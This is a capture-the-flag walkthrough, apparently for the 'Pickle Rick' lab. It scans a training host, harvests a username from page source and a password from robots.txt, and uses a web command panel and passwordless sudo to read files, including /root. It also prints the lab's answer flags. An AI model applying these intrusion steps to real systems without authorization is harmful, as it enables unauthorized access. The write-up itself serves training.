## Target Information
- **IP Address**: 10.10.200.151

## Open Ports

Start with an nmap scan:

```bash
nmap -sC -sV $IP
```
### Result:
- Port 22: OpenSSH 7.2p2
- Port 80: Apache httpd 2.4.18

## Vulnerability Scanning

```bash 
nikto --url http://$IP
```
```/login.php``` was found

## Task 1: What is the first ingredient Rick needs?

**Web Inspection**

Navigate to ```http://$IP``` and check page source:

```html
<!--
  Note to self, remember username!
  Username: *********
-->
```

Save the username.

**Directory busting with dirb:**
- 200 -  588B  - /assets/
- 200 -  455B  - /login.php
- 200 -   17B  - /robots.txt

Visit ```http://$IP/robots.txt``` — found a password-like string.

- Using the username from page source and password from robots.txt. log in to the web application at ```http://$IP/login.php``` gained command panel access.
- Found:
    - Sup3rS3cretPickl3Ingred.txt
        - ```less Sup3rS3cretPickl3Ingred.txt``` revealed first ingredient: **mr. meeseek hair**
    - clue.txt
        - clue: Search filesystem for other ingredients.

## Task 2: What is the second ingredient Rick needs?

**Check Home Directories**

```bash
ls /home
ls /home/rick
less /home/rick/second\ ingredient
```

Second Ingredient: **1 jerry tear**

## Task 3: What's the third ingredient Rick needs?

**Check for sudo permissions**
```bash
sudo ls
```
**Result:** No password required for sudo.

**Check /root directory:**
```bash
sudo ls /root
sudo less /root/3rd.txt
```

Third Ingredient: **fleeb juice**